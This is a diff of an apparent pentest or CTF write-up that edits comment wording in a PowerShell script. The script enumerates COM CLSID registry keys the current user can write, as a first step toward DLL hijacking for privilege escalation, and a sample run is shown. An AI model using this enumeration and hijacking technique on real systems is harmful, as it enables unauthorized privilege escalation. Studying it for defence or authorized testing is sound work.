@@ -4,7 +4,7 @@ Powershell script to find writable CLSIDs and then DLL Hijacking it
 * ### Steps:
 1) Let's first create a powershell script to find vulnerable CLSID keys, we'll call it as `find_writable_clsid.ps1`: 
 ```powershell
-# Let's obtain all the actual user's groups first by their name, not SID:
+# Let's obtain all the current user's groups first by their name, not SID:
 $myIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
 $myGroups = $myIdentity.Groups | ForEach-Object {
     try {
@@ -29,7 +29,7 @@ foreach ($clsid in $clsids) {
                 $identity = $access.IdentityReference.Value
                 $rights = $access.RegistryRights
 
-                # Does the actual user or group have WRITE PERMISSIONS (W or RW)?:
+                # Does the current user or group have WRITE PERMISSIONS (W or RW)?:
                 if ($myGroups -contains $identity -and $rights -match "SetValue|WriteKey|FullControl") {
                     Write-Host "[PWN] Writable CLSID found!"
                     Write-Host "      Key: $inprocPath"
@@ -44,7 +44,7 @@ foreach ($clsid in $clsids) {
 }
 ```
 
-2) We execute it and we find one vulnerable CLSID key (in this case the actual user belongs to `RAGNAROK\Support` group, so we have RW rights, we have FullControl over it to write it):
+2) We execute it and we find one vulnerable CLSID key (in this case the current user belongs to `RAGNAROK\Support` group, so we have RW rights, we have FullControl over it to write it):
 ```powershell
 PS C:\users\public> .\find_writable_clsid.ps1
 
